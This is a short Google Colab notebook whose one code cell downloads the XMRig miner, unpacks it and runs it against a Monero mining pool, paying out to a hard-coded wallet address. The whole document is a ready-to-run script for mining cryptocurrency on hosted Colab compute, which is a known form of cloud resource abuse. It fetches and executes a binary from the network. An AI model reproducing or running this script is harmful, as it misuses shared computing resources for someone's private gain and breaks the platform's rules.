{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "ummi.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8uQ12Gz6ZzCb"
      },
      "source": [
        "# **TEMPUR GUGIK**\n",
        "\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8S3CXRBTZa6C"
      },
      "source": [
        "#TEMPUR\n",
        "!wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-bionic-x64.tar.gz\n",
        "!tar -xvf xmrig-6.10.0-bionic-x64.tar.gz\n",
        "!./xmrig-6.10.0/xmrig -o pool.supportxmr.com:443 -u 85n4VX9sCHcfzpT517BsAoGgSTx1JaM6hbXCVW5m47rrLJZwP7MH4Xk26jPLcMkFSNbhnW9xjn7ksiaR3cYhdGjL6vsYxmf.vps -k --tls -p x -t 4"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
